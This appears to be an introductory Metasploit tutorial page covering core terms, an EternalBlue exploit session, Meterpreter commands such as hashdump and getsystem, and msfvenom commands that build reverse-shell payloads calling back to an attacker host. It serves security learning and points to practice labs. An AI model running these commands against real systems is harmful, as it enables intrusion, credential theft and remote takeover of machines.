---
layout: default
title: Metasploit Basics
---

# Metasploit Basics

## What is Metasploit
Metasploit is an open-source penetration testing framework. It provides exploits, payloads, and post-exploitation tools in one place.

## Starting Metasploit
```bash
msfconsole
```

## Core Concepts

| Term | Meaning |
|------|---------|
| Module | A piece of code that does a specific task |
| Exploit | Code that takes advantage of a vulnerability |
| Payload | Code that runs on the target after exploitation |
| Listener | Waits for a connection back from the target |
| Session | An active connection to a compromised target |
| Meterpreter | Advanced interactive payload |

## Module Types
- `exploit/` – exploits vulnerabilities
- `auxiliary/` – scanning, fuzzing, brute force
- `post/` – post-exploitation
- `payload/` – shellcode to run on target
- `encoder/` – obfuscate payloads
- `nop/` – no-operation sled

## Basic Workflow
search <vulnerability or service>
use <module path>
show options
set RHOSTS <target IP>
set LHOST <your IP>
set LPORT <port>
run

## Example: Searching and Using
```bash
msf6> search eternalblue
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6> set RHOSTS 10.10.10.1
msf6> set LHOST 10.9.0.1
msf6> run
```

## Common Commands
```bash
search <term>          # find modules
use <module>           # load a module
show options           # display required settings
set <option> <value>   # configure option
info                   # show module details
run / exploit          # launch the module
sessions               # list active sessions
sessions -i 1          # interact with session 1
background             # background current session
```

## Meterpreter Common Commands
```bash
sysinfo           # system information
getuid            # current user
getsystem         # attempt privilege escalation
hashdump          # dump password hashes
shell             # drop to OS shell
upload            # upload file to target
download          # download file from target
run post/...      # run post-exploitation module
```

## Generating Payloads with msfvenom
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your IP> LPORT=4444 -f exe -o payload.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your IP> LPORT=4444 -f elf -o payload
```

## Key Terms
- Reverse shell: target connects back to attacker
- Bind shell: attacker connects to listener on target
- Staged payload: small stager downloads main payload
- Stageless payload: everything in one file

## Ethical Use Only
Only use Metasploit on systems you own or have explicit permission to test.

## Practice Labs
- TryHackMe: Metasploit module series
- Metasploitable2 VM (intentionally vulnerable)
- HackTheBox (with legal authorization)
